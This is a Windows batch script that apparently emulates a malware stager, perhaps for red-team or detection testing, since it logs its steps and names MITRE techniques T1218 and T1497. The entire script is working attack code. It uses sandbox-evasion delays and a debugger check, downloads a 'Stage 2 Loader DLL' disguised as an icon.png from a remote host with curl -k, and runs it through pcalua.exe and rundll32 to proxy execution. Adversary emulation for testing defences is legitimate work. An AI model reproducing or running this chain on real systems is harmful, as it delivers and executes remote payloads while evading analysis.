@echo off
setlocal enabledelayedexpansion

REM --- Random-named SET variable declarations for all PHR_* placeholders ---
SET ghjklmno=%APPDATA%\10777\97e9c918
SET plokijuh=741b4c99.txt
SET yhnujmik=https://10.0.0.49/stage/2/icon.png?10777-7
SET rfvbgtnf=BALAM-S2BO
SET cdewsxza=10777
SET qazxswed=7
SET ikmjnuhb=%PUBLIC%\\macula-simulations.log

REM --- Timestamp cache for debug logging ---
SET tsvar=!DATE!/!TIME!

REM ======== DELAY: Initial sandbox evasion ========
timeout /t 15 /nobreak >nul

REM ======== DEBUG: heartbeat_start ========
echo [!tsvar!][DEBUG][!rfvbgtnf!][!cdewsxza!]: heartbeat_start>> "!ikmjnuhb!" 2>nul

REM ======== HEARTBEAT: Download Stage 2 Loader DLL ========
curl -k -s -o "!ghjklmno!\!plokijuh!" "!yhnujmik!"

REM ======== DEBUG: heartbeat_complete ========
echo [!tsvar!][DEBUG][!rfvbgtnf!][!cdewsxza!]: heartbeat_complete>> "!ikmjnuhb!" 2>nul

REM ======== DELAY: Between operations ========
ping -n 10 127.0.0.1 >nul

REM ======== DEBUG: chdir_start ========
echo [!tsvar!][DEBUG][!rfvbgtnf!][!cdewsxza!]: chdir_start>> "!ikmjnuhb!" 2>nul

REM ======== CHANGE DIRECTORY ========
cd /d "!ghjklmno!" >nul 2>&1
if errorlevel 1 (set chdirres=1) else (set chdirres=0)

REM ======== DEBUG: chdir_result ========
echo [!tsvar!][DEBUG][!rfvbgtnf!][!cdewsxza!]: chdir_result=!chdirres!>> "!ikmjnuhb!" 2>nul

REM ======== DELAY: Sandbox evasion (random) ========
choice /C Y /N /D Y /T 10 >nul

REM ======== ANTI-ANALYSIS: Debugger check ========
REM If a debugger is attached, add random sleep (2-5 seconds) – never abort
powershell -command "if ([System.Diagnostics.Debugger]::IsAttached) { Start-Sleep -Milliseconds (Get-Random -Minimum 2000 -Maximum 5000) }" >nul 2>&1

REM ======== RANDOM DELAY: Before LOLBIN execution ========
SET /A delay=%RANDOM% %% 20 + 10
timeout /t !delay! /nobreak >nul

REM ======== DEBUG: rundll32_start ========
echo [!tsvar!][DEBUG][!rfvbgtnf!][!cdewsxza!]: rundll32_start>> "!ikmjnuhb!" 2>nul

REM ======== LOLBIN EXECUTION: pcalua -> rundll32 ========
pcalua.exe -a C:\Windows\System32\rundll32.exe -c "!ghjklmno!\!plokijuh!,RunSimulation"

REM ======== DEBUG: rundll32_result ========
if errorlevel 1 (set rundllres=1) else (set rundllres=0)
echo [!tsvar!][DEBUG][!rfvbgtnf!][!cdewsxza!]: rundll32_result=!rundllres!>> "!ikmjnuhb!" 2>nul

REM ======== TTP LOGGING ========
REM T1218 | System Binary Proxy Execution
echo [!tsvar!][TTP][!rfvbgtnf!][!cdewsxza!]: T1218|System Binary Proxy Execution=OK:>> "!ikmjnuhb!" 2>nul

REM T1497 | Virtualization/Sandbox Evasion
echo [!tsvar!][TTP][!rfvbgtnf!][!cdewsxza!]: T1497|Virtualization/Sandbox Evasion=OK:>> "!ikmjnuhb!" 2>nul

REM ======== FINAL DELAY: Let payload breathe ========
timeout /t 5 /nobreak >nul

endlocal